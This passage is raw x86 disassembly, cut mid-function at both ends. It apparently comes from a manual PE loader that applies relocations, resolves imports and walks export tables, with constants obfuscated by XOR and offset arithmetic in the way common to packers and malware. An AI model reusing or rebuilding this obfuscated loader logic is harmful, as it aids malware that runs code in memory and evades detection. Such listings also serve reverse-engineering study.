  427099:	mov    eax,DWORD PTR [eax+0x198]
  42709f:	mov    DWORD PTR [ebp-0x70],0x4
  4270a6:	push   DWORD PTR [eax]
  4270a8:	mov    eax,DWORD PTR [ebp+0x10]
  4270ab:	call   eax
  4270ad:	test   eax,eax
  4270af:	je     0x4270d4
  4270b1:	and    DWORD PTR [ebp+0xc],0x0
  4270b5:	cmp    DWORD PTR [ebx+0x50],0x0
  4270b9:	jbe    0x4270d4
  4270bb:	mov    eax,DWORD PTR [ebp+0x1c]
  4270be:	mov    ecx,DWORD PTR [ebp-0x10]
  4270c1:	sub    ecx,eax
  4270c3:	mov    dl,BYTE PTR [ecx+eax*1]
  4270c6:	inc    DWORD PTR [ebp+0xc]
  4270c9:	mov    BYTE PTR [eax],dl
  4270cb:	mov    edx,DWORD PTR [ebp+0xc]
  4270ce:	inc    eax
  4270cf:	cmp    edx,DWORD PTR [ebx+0x50]
  4270d2:	jb     0x4270c3
  4270d4:	mov    edx,DWORD PTR [ebp+0x1c]
  4270d7:	mov    ecx,DWORD PTR [edx+0x3c]
  4270da:	add    ecx,edx
  4270dc:	mov    eax,DWORD PTR [ecx+0xa0]
  4270e2:	mov    ebx,DWORD PTR [ecx+0x28]
  4270e5:	add    eax,edx
  4270e7:	sub    edx,DWORD PTR [ebp-0x10]
  4270ea:	add    ebx,DWORD PTR [ebp+0x1c]
  4270ed:	mov    DWORD PTR [ebp+0xc],edx
  4270f0:	mov    DWORD PTR [ebp-0x2c],ecx
  4270f3:	mov    DWORD PTR [ebp-0x14],ebx
  4270f6:	mov    DWORD PTR [ebp-0x8],0x0
  4270fd:	jmp    0x427179
  4270ff:	add    edx,0xfffffff8
  427102:	shr    edx,1
  427104:	mov    DWORD PTR [ebp-0x18],edx
  427107:	je     0x427165
  427109:	lea    edx,[eax+0x8]
  42710c:	mov    DWORD PTR [ebp-0x4],edx
  42710f:	mov    edx,DWORD PTR [ebp-0x18]
  427112:	mov    DWORD PTR [ebp-0x18],edx
  427115:	mov    edx,DWORD PTR [ebp-0x4]
  427118:	movzx  edx,WORD PTR [edx]
  42711b:	mov    DWORD PTR [ebp-0x24],edx
  42711e:	and    edx,0xfff
  427124:	mov    DWORD PTR [ebp-0x28],edx
  427127:	mov    edx,DWORD PTR [ebp-0x24]
  42712a:	shr    edx,0xc
  42712d:	add    edx,0xffcd8d0b
  427133:	xor    edx,esi
  427135:	cmp    edx,0xf89c85a0
  42713b:	jne    0x42715c
  42713d:	mov    edx,DWORD PTR [ebp-0x28]
  427140:	add    edx,DWORD PTR [ebp+0x1c]
  427143:	mov    ebx,DWORD PTR [eax]
  427145:	cmp    DWORD PTR [ebx+edx*1],0x0
  427149:	je     0x427159
  42714b:	mov    ecx,DWORD PTR [ebp+0xc]
  42714e:	add    ecx,DWORD PTR [ebx+edx*1]
  427151:	mov    ebx,DWORD PTR [eax]
  427153:	mov    DWORD PTR [edx+ebx*1],ecx
  427156:	mov    ecx,DWORD PTR [ebp-0x2c]
  427159:	mov    ebx,DWORD PTR [ebp-0x14]
  42715c:	add    DWORD PTR [ebp-0x4],0x2
  427160:	dec    DWORD PTR [ebp-0x18]
  427163:	jne    0x427115
  427165:	mov    edx,DWORD PTR [ebp-0xc]
  427168:	add    DWORD PTR [ebp-0x8],edx
  42716b:	mov    edx,DWORD PTR [ebp-0x8]
  42716e:	cmp    edx,DWORD PTR [ecx+0xa4]
  427174:	jae    0x427187
  427176:	add    eax,DWORD PTR [ebp-0xc]
  427179:	mov    edx,DWORD PTR [eax+0x4]
  42717c:	mov    DWORD PTR [ebp-0xc],edx
  42717f:	test   edx,edx
  427181:	jne    0x4270ff
  427187:	mov    eax,DWORD PTR [ebp-0x10]
  42718a:	mov    DWORD PTR [ebp-0x6c],eax
  42718d:	mov    DWORD PTR [ebp-0x70],0x4
  427194:	mov    eax,DWORD PTR [ecx+0x50]
  427197:	mov    DWORD PTR [ebp-0x68],eax
  42719a:	mov    eax,DWORD PTR [ebp-0x1c]
  42719d:	xor    eax,esi
  42719f:	add    eax,edi
  4271a1:	mov    DWORD PTR [ebp-0x64],eax
  4271a4:	lea    eax,[ebp-0x20]
  4271a7:	mov    DWORD PTR [ebp-0x60],eax
  4271aa:	lea    eax,[ebp-0x70]
  4271ad:	push   eax
  4271ae:	mov    eax,DWORD PTR [ebp+0x8]
  4271b1:	xor    eax,esi
  4271b3:	add    eax,edi
  4271b5:	push   eax
  4271b6:	mov    eax,DWORD PTR [ebp+0x20]
  4271b9:	add    eax,0xee
  4271be:	push   eax
  4271bf:	mov    eax,DWORD PTR [ebp+0x20]
  4271c2:	mov    eax,DWORD PTR [eax+0x198]
  4271c8:	push   DWORD PTR [eax]
  4271ca:	mov    eax,DWORD PTR [ebp+0x10]
  4271cd:	call   eax
  4271cf:	mov    eax,DWORD PTR [ebp+0x20]
  4271d2:	mov    eax,DWORD PTR [eax+0x180]
  4271d8:	add    eax,DWORD PTR [ebp+0xc]
  4271db:	mov    ecx,DWORD PTR [ebp+0xc]
  4271de:	push   DWORD PTR [ebp+0x18]
  4271e1:	mov    DWORD PTR [eax],ecx
  4271e3:	push   DWORD PTR [ebp+0x14]
  4271e6:	push   DWORD PTR [ebp+0x1c]
  4271e9:	call   ebx
  4271eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4271ee:	add    ecx,DWORD PTR [ebp+0x20]
  4271f1:	lea    eax,[ebp+0x4]
  4271f4:	mov    DWORD PTR [ebp+0x20],ecx
  4271f7:	mov    ecx,DWORD PTR [ebp+0x20]
  4271fa:	mov    ecx,DWORD PTR [ebp+0x20]
  4271fd:	mov    edx,DWORD PTR [ecx+0x190]
  427203:	mov    ecx,DWORD PTR [ebp+0x20]
  427206:	mov    ecx,DWORD PTR [ecx+0x18c]
  42720c:	mov    esi,DWORD PTR [ecx]
  42720e:	cmp    DWORD PTR [eax],esi
  427210:	jb     0x427231
  427212:	mov    esi,DWORD PTR [edx]
  427214:	mov    edi,DWORD PTR [edx]
  427216:	mov    esi,DWORD PTR [esi+0x3c]
  427219:	lea    esi,[edi+esi*1+0x50]
  42721d:	mov    edi,DWORD PTR [ecx]
  42721f:	add    edi,DWORD PTR [esi]
  427221:	cmp    DWORD PTR [eax],edi
  427223:	jae    0x427231
  427225:	mov    esi,DWORD PTR [ecx]
  427227:	mov    ecx,DWORD PTR [eax]
  427229:	mov    edx,DWORD PTR [edx]
  42722b:	sub    ecx,esi
  42722d:	add    edx,ecx
  42722f:	mov    DWORD PTR [eax],edx
  427231:	mov    eax,DWORD PTR [ebp+0xc]
  427234:	jmp    0x427238
  427236:	xor    eax,eax
  427238:	pop    edi
  427239:	pop    esi
  42723a:	pop    ebx
  42723b:	leave  
  42723c:	ret    0x1c
  42723f:	push   ebp
  427240:	mov    ebp,esp
  427242:	sub    esp,0x1c
  427245:	push   esi
  427246:	mov    esi,eax
  427248:	mov    eax,DWORD PTR [ecx+0x190]
  42724e:	cmp    DWORD PTR [eax],0x0
  427251:	je     0x427361
  427257:	test   edx,edx
  427259:	je     0x427361
  42725f:	test   esi,esi
  427261:	je     0x427361
  427267:	mov    eax,DWORD PTR [esi+0x88]
  42726d:	test   eax,eax
  42726f:	je     0x42735c
  427275:	cmp    DWORD PTR [esi+0x8c],0x10
  42727c:	je     0x42735c
  427282:	cmp    DWORD PTR [esi+0x34],edx
  427285:	je     0x42735c
  42728b:	mov    esi,DWORD PTR [ecx+0x18c]
  427291:	and    DWORD PTR [ebp-0x10],0x0
  427295:	mov    ecx,edx
  427297:	sub    ecx,DWORD PTR [esi]
  427299:	add    eax,edx
  42729b:	movzx  edx,WORD PTR [eax+0xc]
  42729f:	mov    DWORD PTR [ebp-0x1c],ecx
  4272a2:	movzx  ecx,WORD PTR [eax+0xe]
  4272a6:	add    ecx,edx
  4272a8:	je     0x42735c
  4272ae:	lea    ecx,[eax+0x14]
  4272b1:	push   ebx
  4272b2:	mov    DWORD PTR [ebp-0x18],ecx
  4272b5:	mov    esi,0x7fffffff
  4272ba:	push   edi
  4272bb:	test   DWORD PTR [ecx],esi
  4272bd:	je     0x42733e
  4272bf:	mov    edx,DWORD PTR [ecx]
  4272c1:	and    DWORD PTR [ebp-0xc],0x0
  4272c5:	and    edx,esi
  4272c7:	add    edx,eax
  4272c9:	movzx  edi,WORD PTR [edx+0xe]
  4272cd:	movzx  ebx,WORD PTR [edx+0xc]
  4272d1:	add    edi,ebx
  4272d3:	je     0x42733e
  4272d5:	lea    ecx,[edx+0x14]
  4272d8:	mov    DWORD PTR [ebp-0x14],ecx
  4272db:	test   DWORD PTR [ecx],esi
  4272dd:	je     0x427320
  4272df:	mov    ecx,DWORD PTR [ecx]
  4272e1:	and    DWORD PTR [ebp-0x8],0x0
  4272e5:	and    ecx,esi
  4272e7:	add    ecx,eax
  4272e9:	movzx  edi,WORD PTR [ecx+0xe]
  4272ed:	movzx  ebx,WORD PTR [ecx+0xc]
  4272f1:	add    edi,ebx
  4272f3:	je     0x427320
  4272f5:	lea    edi,[ecx+0x14]
  4272f8:	mov    DWORD PTR [ebp-0x4],edi
  4272fb:	mov    edi,DWORD PTR [ebp-0x4]
  4272fe:	mov    edi,DWORD PTR [edi]
  427300:	test   edi,edi
  427302:	je     0x42730a
  427304:	mov    ebx,DWORD PTR [ebp-0x1c]
  427307:	add    DWORD PTR [edi+eax*1],ebx
  42730a:	movzx  edi,WORD PTR [ecx+0xe]
  42730e:	movzx  ebx,WORD PTR [ecx+0xc]
  427312:	inc    DWORD PTR [ebp-0x8]
  427315:	add    DWORD PTR [ebp-0x4],0x8
  427319:	add    edi,ebx
  42731b:	cmp    DWORD PTR [ebp-0x8],edi
  42731e:	jb     0x4272fb
  427320:	movzx  edi,WORD PTR [edx+0xe]
  427324:	movzx  ebx,WORD PTR [edx+0xc]
  427328:	mov    ecx,DWORD PTR [ebp-0x14]
  42732b:	inc    DWORD PTR [ebp-0xc]
  42732e:	add    ecx,0x8
  427331:	add    edi,ebx
  427333:	mov    DWORD PTR [ebp-0x14],ecx
  427336:	cmp    DWORD PTR [ebp-0xc],edi
  427339:	jb     0x4272db
  42733b:	mov    ecx,DWORD PTR [ebp-0x18]
  42733e:	movzx  edx,WORD PTR [eax+0xe]
  427342:	movzx  edi,WORD PTR [eax+0xc]
  427346:	inc    DWORD PTR [ebp-0x10]
  427349:	add    ecx,0x8
  42734c:	add    edx,edi
  42734e:	mov    DWORD PTR [ebp-0x18],ecx
  427351:	cmp    DWORD PTR [ebp-0x10],edx
  427354:	jb     0x4272bb
  42735a:	pop    edi
  42735b:	pop    ebx
  42735c:	xor    eax,eax
  42735e:	inc    eax
  42735f:	jmp    0x427363
  427361:	xor    eax,eax
  427363:	pop    esi
  427364:	leave  
  427365:	ret    
  427366:	push   ebp
  427367:	mov    ebp,esp
  427369:	mov    ecx,DWORD PTR [ecx+0x190]
  42736f:	mov    eax,DWORD PTR [ebp+0xc]
  427372:	sub    esp,0x10
  427375:	push   ebx
  427376:	xor    ebx,ebx
  427378:	push   esi
  427379:	push   edi
  42737a:	cmp    DWORD PTR [ecx],ebx
  42737c:	je     0x427404
  427382:	cmp    eax,ebx
  427384:	je     0x427404
  427386:	cmp    DWORD PTR [eax+0x78],ebx
  427389:	jne    0x427390
  42738b:	xor    eax,eax
  42738d:	inc    eax
  42738e:	jmp    0x427406
  427390:	mov    eax,DWORD PTR [eax+0x78]
  427393:	add    eax,DWORD PTR [ebp+0x8]
  427396:	mov    ecx,DWORD PTR [eax+0x1c]
  427399:	mov    edx,DWORD PTR [eax+0x24]
  42739c:	mov    esi,DWORD PTR [eax+0x14]
  42739f:	mov    edi,DWORD PTR [eax+0x18]
  4273a2:	add    ecx,DWORD PTR [ebp+0x8]
  4273a5:	add    edx,DWORD PTR [ebp+0x8]
  4273a8:	mov    DWORD PTR [ebp-0x4],esi
  4273ab:	cmp    esi,edi
  4273ad:	ja     0x4273b2
  4273af:	mov    DWORD PTR [ebp-0x4],edi
  4273b2:	mov    DWORD PTR [ebp-0x8],ebx
  4273b5:	cmp    DWORD PTR [ebp-0x4],ebx
  4273b8:	jbe    0x42738b
  4273ba:	cmp    ebx,DWORD PTR [eax+0x14]
  4273bd:	jae    0x4273c5
  4273bf:	movzx  esi,WORD PTR [edx+ebx*2]
  4273c3:	jmp    0x4273c7
  4273c5:	mov    esi,ebx
  4273c7:	lea    esi,[ecx+esi*4]
  4273ca:	mov    edi,DWORD PTR [esi]
  4273cc:	test   edi,edi
  4273ce:	je     0x4273f9
  4273d0:	add    edi,DWORD PTR [ebp+0x8]
  4273d3:	mov    DWORD PTR [ebp-0x10],edi
  4273d6:	cmp    edi,eax
  4273d8:	jbe    0x4273ea
  4273da:	mov    ebx,DWORD PTR [ebp+0xc]
  4273dd:	mov    ebx,DWORD PTR [ebx+0x7c]
  4273e0:	add    ebx,eax
  4273e2:	cmp    edi,ebx
  4273e4:	jae    0x4273ea
  4273e6:	mov    esi,DWORD PTR [esi]
  4273e8:	jmp    0x4273f2
  4273ea:	sub    edi,DWORD PTR [ebp+0x8]
  4273ed:	mov    DWORD PTR [esi],edi
  4273ef:	mov    esi,DWORD PTR [ebp-0x10]
  4273f2:	test   esi,esi
  4273f4:	je     0x427404
  4273f6:	mov    ebx,DWORD PTR [ebp-0x8]
  4273f9:	inc    ebx
  4273fa:	mov    DWORD PTR [ebp-0x8],ebx
  4273fd:	cmp    ebx,DWORD PTR [ebp-0x4]
  427400:	jb     0x4273ba
  427402:	jmp    0x42738b
  427404:	xor    eax,eax
  427406:	pop    edi
  427407:	pop    esi
  427408:	pop    ebx
  427409:	leave  
  42740a:	ret    0x8
  42740d:	push   ebp
  42740e:	mov    ebp,esp
  427410:	sub    esp,0x2c
  427413:	mov    edx,0xf89c85a5
  427418:	mov    DWORD PTR [ebp-0x4],edx
  42741b:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  427422:	mov    eax,DWORD PTR [ebp-0x4]
  427425:	mov    ecx,DWORD PTR [ebp-0x4]
  427428:	mov    ecx,DWORD PTR [ebp-0x4]
  42742b:	mov    ecx,DWORD PTR [ebp-0x4]
  42742e:	mov    ecx,DWORD PTR [ebp-0x4]
  427431:	mov    ecx,DWORD PTR [ebp-0x4]
  427434:	push   ebx
  427435:	mov    ebx,DWORD PTR [ebp+0x10]
  427438:	push   esi
  427439:	mov    esi,0x75108ae
  42743e:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  427445:	mov    ecx,DWORD PTR [ebp-0x4]
  427448:	mov    ebx,DWORD PTR [ebx+0x190]
  42744e:	push   edi
  42744f:	mov    edi,0x3272f5
  427454:	xor    ecx,esi
  427456:	xor    eax,esi
  427458:	add    eax,edi
  42745a:	add    ecx,edi
  42745c:	mov    DWORD PTR [ebp-0x18],eax
  42745f:	cmp    ecx,DWORD PTR [ebx]
  427461:	je     0x4276e2
  427467:	mov    ebx,DWORD PTR [ebp-0x4]
  42746a:	mov    ecx,DWORD PTR [ebp+0xc]
  42746d:	xor    ebx,esi
  42746f:	add    ebx,edi
  427471:	cmp    ebx,ecx
  427473:	je     0x4276e2
  427479:	mov    ebx,DWORD PTR [ebp-0x4]
  42747c:	mov    ecx,DWORD PTR [ecx+0x80]
  427482:	xor    ebx,esi
  427484:	add    ebx,edi
  427486:	cmp    ecx,ebx
  427488:	je     0x4276dd
  42748e:	add    ecx,DWORD PTR [ebp+0x8]
  427491:	mov    DWORD PTR [ebp-0x2c],ecx
  427494:	mov    ebx,edx
  427496:	xor    ebx,esi
  427498:	add    ebx,edi
  42749a:	mov    DWORD PTR [ebp-0x10],ebx
  42749d:	mov    ebx,DWORD PTR [ebp-0x10]
  4274a0:	cmp    ebx,edx
  4274a2:	je     0x4274b6
  4274a4:	mov    edx,DWORD PTR [ebp-0x10]
  4274a7:	mov    ebx,DWORD PTR [ebp-0x4]
  4274aa:	imul   edx,edx,0x14
  4274ad:	xor    ebx,esi
  4274af:	add    ebx,edi
  4274b1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4274b4:	jne    0x4274cd
  4274b6:	mov    edx,DWORD PTR [ebp-0x10]
  4274b9:	mov    ebx,DWORD PTR [ebp-0x4]
  4274bc:	imul   edx,edx,0x14
  4274bf:	xor    ebx,esi
  4274c1:	add    ebx,edi
  4274c3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4274c7:	je     0x4276cf
  4274cd:	mov    eax,DWORD PTR [ebp-0x4]
  4274d0:	mov    ebx,DWORD PTR [ebp-0x4]
  4274d3:	mov    eax,DWORD PTR [ebp-0x10]
  4274d6:	imul   eax,eax,0x14
  4274d9:	add    eax,ecx
  4274db:	mov    ecx,DWORD PTR [eax+0x10]
  4274de:	add    ecx,DWORD PTR [ebp+0x8]
  4274e1:	xor    ebx,esi
  4274e3:	mov    DWORD PTR [ebp-0x1c],ecx
  4274e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4274e9:	mov    edx,DWORD PTR [ebp-0x4]
  4274ec:	xor    ecx,esi
  4274ee:	add    ecx,edi
  4274f0:	xor    edx,esi
  4274f2:	mov    DWORD PTR [ebp-0x24],ecx
  4274f5:	mov    ecx,DWORD PTR [eax]
  4274f7:	add    edx,edi
  4274f9:	add    ebx,edi
  4274fb:	cmp    ecx,edx
  4274fd:	je     0x427505
  4274ff:	add    ecx,DWORD PTR [ebp+0x8]
  427502:	mov    DWORD PTR [ebp-0x24],ecx
  427505:	mov    ecx,DWORD PTR [ebp-0x4]
  427508:	xor    ecx,esi
  42750a:	add    ecx,DWORD PTR [eax+0xc]
  42750d:	mov    eax,DWORD PTR [ebp+0x8]
  427510:	lea    eax,[ecx+eax*1+0x3272f5]
  427517:	mov    DWORD PTR [ebp+0xc],eax
  42751a:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  427521:	mov    eax,DWORD PTR [ebp+0x10]
  427524:	push   DWORD PTR [ebp+0xc]
  427527:	mov    eax,DWORD PTR [eax+0x1e0]
  42752d:	call   DWORD PTR [eax]
  42752f:	mov    ecx,DWORD PTR [ebp-0x4]
  427532:	xor    ecx,esi
  427534:	add    ecx,edi
  427536:	mov    DWORD PTR [ebp-0xc],eax
  427539:	cmp    ecx,eax
  42753b:	jne    0x42754f
  42753d:	mov    eax,DWORD PTR [ebp+0x10]
  427540:	push   DWORD PTR [ebp+0xc]
  427543:	mov    eax,DWORD PTR [eax+0x1e0]
  427549:	call   DWORD PTR [eax+0xc]
  42754c:	mov    DWORD PTR [ebp-0xc],eax
  42754f:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  427556:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  42755d:	mov    eax,DWORD PTR [ebp-0x4]
  427560:	xor    eax,esi
  427562:	add    eax,edi
  427564:	cmp    eax,DWORD PTR [ebp-0xc]
  427567:	jne    0x42758c
  427569:	mov    eax,DWORD PTR [ebp-0x8]
  42756c:	mov    ecx,DWORD PTR [ebp-0x20]
  42756f:	xor    eax,esi
  427571:	xor    ecx,esi
  427573:	lea    ebx,[ebx+eax*1+0x3272f5]
  42757a:	mov    eax,DWORD PTR [ebp+0x10]
  42757d:	mov    eax,DWORD PTR [eax+0x1e0]
  427583:	add    ecx,edi
  427585:	imul   ecx,ebx
  427588:	push   ecx
  427589:	call   DWORD PTR [eax+0x24]
  42758c:	mov    eax,DWORD PTR [ebp-0x4]
  42758f:	xor    eax,esi
  427591:	add    eax,edi
  427593:	cmp    eax,DWORD PTR [ebp-0xc]
  427596:	jne    0x4275a7
  427598:	mov    eax,DWORD PTR [ebp-0x28]
  42759b:	xor    eax,esi
  42759d:	add    eax,edi
  42759f:	cmp    ebx,eax
  4275a1:	jbe    0x427521
  4275a7:	mov    eax,DWORD PTR [ebp-0x4]
  4275aa:	xor    eax,esi
  4275ac:	add    eax,edi
  4275ae:	cmp    eax,DWORD PTR [ebp-0xc]
  4275b1:	jne    0x4275ca
  4275b3:	mov    eax,DWORD PTR [ebp-0x8]
  4275b6:	mov    ecx,DWORD PTR [ebp-0x18]
  4275b9:	xor    eax,esi
  4275bb:	lea    eax,[ecx+eax*1+0x3272f5]
  4275c2:	mov    DWORD PTR [ebp-0x18],eax
  4275c5:	jmp    0x4276b9
  4275ca:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  4275d1:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  4275d8:	mov    ebx,DWORD PTR [ebp-0x4]
  4275db:	xor    ebx,esi
  4275dd:	add    ebx,edi
  4275df:	jmp    0x4276a6
  4275e4:	mov    eax,DWORD PTR [ebp-0x4]
  4275e7:	xor    eax,esi
  4275e9:	add    eax,edi
  4275eb:	mov    DWORD PTR [ebp-0x14],eax
  4275ee:	mov    eax,DWORD PTR [ebp-0x4]
  4275f1:	xor    eax,esi
  4275f3:	add    eax,edi
  4275f5:	mov    DWORD PTR [ebp+0xc],eax
  4275f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4275fb:	mov    eax,DWORD PTR [ebp-0x24]
  4275fe:	xor    ecx,esi
  427600:	add    ecx,edi
  427602:	cmp    ecx,eax
  427604:	je     0x42760c
  427606:	mov    eax,DWORD PTR [eax+ebx*4]
  427609:	mov    DWORD PTR [ebp-0x14],eax
  42760c:	mov    eax,DWORD PTR [ebp-0x1c]
  42760f:	mov    eax,DWORD PTR [eax+ebx*4]
  427612:	mov    DWORD PTR [ebp+0xc],eax
  427615:	mov    eax,DWORD PTR [ebp-0x4]
  427618:	mov    ecx,DWORD PTR [ebp-0x14]
  42761b:	xor    eax,esi
  42761d:	add    eax,edi
  42761f:	cmp    eax,ecx
  427621:	je     0x42764c
  427623:	mov    eax,DWORD PTR [ebp-0x4]
  427626:	mov    ecx,DWORD PTR [ebp-0x14]
  427629:	xor    eax,esi
  42762b:	add    eax,edi
  42762d:	shr    ecx,0x1f
  427630:	cmp    eax,ecx
  427632:	je     0x42764c
  427634:	mov    ecx,DWORD PTR [ebp-0x14]
  427637:	mov    eax,DWORD PTR [ebp+0x10]
  42763a:	mov    eax,DWORD PTR [eax+0x1e0]
  427640:	movzx  ecx,cx
  427643:	push   ecx
  427644:	push   DWORD PTR [ebp-0xc]
  427647:	call   DWORD PTR [eax+0x8]
  42764a:	jmp    0x427665
  42764c:	mov    eax,DWORD PTR [ebp+0xc]
  42764f:	add    eax,DWORD PTR [ebp+0x8]
  427652:	mov    ecx,DWORD PTR [ebp+0x10]
  427655:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42765b:	add    eax,0x2
  42765e:	push   eax
  42765f:	push   DWORD PTR [ebp-0xc]
  427662:	call   DWORD PTR [ecx+0x8]
  427665:	mov    DWORD PTR [ebp+0xc],eax
  427668:	mov    eax,DWORD PTR [ebp-0x4]
  42766b:	mov    ecx,DWORD PTR [ebp+0xc]
  42766e:	xor    eax,esi
  427670:	add    eax,edi
  427672:	cmp    eax,ecx
  427674:	mov    eax,DWORD PTR [ebp-0x8]
  427677:	jne    0x42768a
  427679:	mov    ecx,DWORD PTR [ebp-0x18]
  42767c:	xor    eax,esi
  42767e:	lea    eax,[ecx+eax*1+0x3272f5]
  427685:	mov    DWORD PTR [ebp-0x18],eax
  427688:	jmp    0x42769a
  42768a:	mov    ecx,DWORD PTR [ebp+0xc]
  42768d:	xor    eax,esi
  42768f:	add    eax,edi
  427691:	imul   eax,ecx
  427694:	mov    ecx,DWORD PTR [ebp-0x1c]
  427697:	mov    DWORD PTR [ecx+ebx*4],eax
  42769a:	mov    eax,DWORD PTR [ebp-0x8]
  42769d:	xor    eax,esi
  42769f:	lea    ebx,[ebx+eax*1+0x3272f5]
  4276a6:	mov    eax,DWORD PTR [ebp-0x4]
  4276a9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4276ac:	xor    eax,esi
  4276ae:	add    eax,edi
  4276b0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4276b3:	jne    0x4275e4
  4276b9:	mov    edx,DWORD PTR [ebp-0x10]
  4276bc:	mov    eax,DWORD PTR [ebp-0x18]
  4276bf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4276c2:	sub    edx,0x3272f4
  4276c8:	xor    edx,esi
  4276ca:	jmp    0x427494
  4276cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4276d2:	xor    ecx,esi
  4276d4:	add    ecx,edi
  4276d6:	cmp    eax,ecx
  4276d8:	mov    eax,DWORD PTR [ebp-0x4]
  4276db:	jne    0x4276e5
  4276dd:	mov    eax,DWORD PTR [ebp-0x8]
  4276e0:	jmp    0x4276e5
  4276e2:	mov    eax,DWORD PTR [ebp-0x4]
  4276e5:	xor    eax,esi
  4276e7:	add    eax,edi
  4276e9:	pop    edi
  4276ea:	pop    esi
  4276eb:	pop    ebx
  4276ec:	leave  
  4276ed:	ret    0xc
  4276f0:	push   ebp
  4276f1:	mov    ebp,esp
  4276f3:	sub    esp,0x28
  4276f6:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4276fd:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  427704:	mov    eax,DWORD PTR [ebp+0xc]
  427707:	mov    DWORD PTR [ebp+0xc],eax
  42770a:	push   esi
  42770b:	mov    eax,eax
  42770d:	mov    eax,DWORD PTR [ebp-0x4]
  427710:	mov    esi,DWORD PTR [ebp+0x8]
  427713:	mov    ecx,0x75108ae
  427718:	xor    eax,ecx
  42771a:	mov    edx,0x3272f5
  42771f:	add    eax,edx
  427721:	cmp    esi,eax
  427723:	je     0x42784a
  427729:	mov    eax,DWORD PTR [ebp+0x8]
  42772c:	mov    esi,DWORD PTR [ebp+0x8]
  42772f:	add    esi,DWORD PTR [eax+0x3c]
  427732:	push   edi
  427733:	mov    DWORD PTR [ebp+0xc],esi
  427736:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42773d:	mov    eax,DWORD PTR [ebp-0x1c]
  427740:	mov    esi,DWORD PTR [ebp-0x4]
  427743:	mov    edi,DWORD PTR [ebp+0xc]
  427746:	xor    esi,ecx
  427748:	xor    eax,ecx
  42774a:	add    esi,edx
  42774c:	cmp    DWORD PTR [edi+eax*8+0x1939820],esi
  427753:	je     0x427844
  427759:	mov    esi,DWORD PTR [ebp+0xc]
  42775c:	mov    eax,DWORD PTR [ebp+0x8]
  42775f:	add    eax,DWORD PTR [esi+0xa0]
  427765:	mov    esi,DWORD PTR [ebp+0x8]
  427768:	mov    edi,DWORD PTR [ebp+0xc]
  42776b:	sub    esi,DWORD PTR [edi+0x34]
  42776e:	mov    edi,DWORD PTR [ebp-0x4]
  427771:	xor    edi,ecx
  427773:	add    edi,edx
  427775:	mov    DWORD PTR [ebp-0x24],esi
  427778:	cmp    esi,edi
  42777a:	je     0x427844
  427780:	mov    esi,DWORD PTR [ebp-0x4]
  427783:	xor    esi,ecx
  427785:	add    esi,edx
  427787:	mov    DWORD PTR [ebp-0x8],esi
  42778a:	push   ebx
  42778b:	mov    DWORD PTR [ebp-0x10],0xf89c85a0
  427792:	jmp    0x42782e
  427797:	mov    esi,DWORD PTR [ebp-0x4]
  42779a:	xor    esi,ecx
  42779c:	lea    edi,[ebx-0x8]
  42779f:	add    esi,edx
  4277a1:	shr    edi,1
  4277a3:	cmp    esi,edi
  4277a5:	jae    0x427814
  4277a7:	sub    edi,esi
  4277a9:	lea    ebx,[eax+esi*2+0x8]
  4277ad:	mov    DWORD PTR [ebp-0x18],edi
  4277b0:	movzx  esi,WORD PTR [ebx]
  4277b3:	and    esi,0xfff
  4277b9:	mov    DWORD PTR [ebp-0x14],esi
  4277bc:	mov    edi,DWORD PTR [ebp-0x14]
  4277bf:	mov    esi,DWORD PTR [eax]
  4277c1:	sub    esi,edx
  4277c3:	add    edi,esi
  4277c5:	movzx  esi,WORD PTR [ebx]
  4277c8:	shr    esi,0xc
  4277cb:	xor    edi,ecx
  4277cd:	mov    DWORD PTR [ebp-0x20],edi
  4277d0:	mov    DWORD PTR [ebp-0x14],esi
  4277d3:	mov    esi,DWORD PTR [ebp-0x20]
  4277d6:	mov    edi,DWORD PTR [ebp+0x8]
  4277d9:	xor    esi,ecx
  4277db:	lea    esi,[esi+edi*1+0x3272f5]
  4277e2:	mov    DWORD PTR [ebp-0x20],esi
  4277e5:	mov    esi,DWORD PTR [ebp-0x10]
  4277e8:	mov    edi,DWORD PTR [ebp-0x14]
  4277eb:	xor    esi,ecx
  4277ed:	add    esi,edx
  4277ef:	cmp    edi,esi
  4277f1:	jne    0x427809
  4277f3:	mov    esi,DWORD PTR [ebp-0x10]
  4277f6:	mov    edi,DWORD PTR [ebp-0x14]
  4277f9:	xor    esi,ecx
  4277fb:	add    esi,edx
  4277fd:	cmp    edi,esi
  4277ff:	jne    0x427809
  427801:	mov    esi,DWORD PTR [ebp-0x20]
  427804:	mov    edi,DWORD PTR [ebp-0x24]
  427807:	add    DWORD PTR [esi],edi
  427809:	add    ebx,0x2
  42780c:	dec    DWORD PTR [ebp-0x18]
  42780f:	jne    0x4277b0
  427811:	mov    ebx,DWORD PTR [ebp-0xc]
  427814:	add    DWORD PTR [ebp-0x8],ebx
  427817:	mov    esi,DWORD PTR [ebp-0x1c]
  42781a:	mov    edi,DWORD PTR [ebp-0x8]
  42781d:	mov    ebx,DWORD PTR [ebp+0xc]
  427820:	xor    esi,ecx
  427822:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939824]
  427829:	jae    0x427843
  42782b:	add    eax,DWORD PTR [ebp-0xc]
  42782e:	mov    esi,DWORD PTR [ebp-0x4]
  427831:	mov    ebx,DWORD PTR [eax+0x4]
  427834:	xor    esi,ecx
  427836:	add    esi,edx
  427838:	mov    DWORD PTR [ebp-0xc],ebx
  42783b:	cmp    ebx,esi
  42783d:	jne    0x427797
  427843:	pop    ebx
  427844:	mov    eax,DWORD PTR [ebp-0x28]
  427847:	pop    edi
